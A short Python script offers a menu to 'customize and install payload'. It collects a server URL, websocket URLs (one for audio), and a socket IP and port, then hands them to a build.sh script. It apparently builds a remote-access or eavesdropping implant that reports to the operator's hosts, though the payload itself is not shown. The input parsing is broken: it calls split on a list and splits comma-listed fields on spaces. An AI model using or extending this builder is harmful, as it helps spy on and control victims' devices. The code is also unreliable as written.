from shapes import print_logo,print_help
import subprocess
if __name__ == "__main__":
    print_logo()
    while True:
        print("\033[1;36m")  
        print("""
        1- Customize and install payload.
        2- Help.
        3- Exit.
        """)
        print("\033[0m")
        try:
            ch = int(input("Choose option: "))
            match ch:
                case 1:
                    hosts = input("SERVER_URL,WEBSOCKET_URL,WEBSOCKET_AUDIO_URL,IP_ADDRESS_SOCKET,PORT_SOCKET > ")
                    parts = hosts.split(' ')
                    server_url = parts.split(' ')[0]
                    web_socket_url = parts.split(' ')[1]
                    web_socket_audio_url = parts.split(' ')[2]
                    ip_address_socket = parts.split(' ')[3]
                    port_socket = parts.split(' ')[4]
                    subprocess.run(["./build.sh",server_url,web_socket_url,web_socket_audio_url,ip_address_socket,port_socket])
                case 2:
                    print_help()
                case 3:
                    break
                case _:
                    print("Please enter the correct value")
        except ValueError:
            print("Please enter a number")
            continue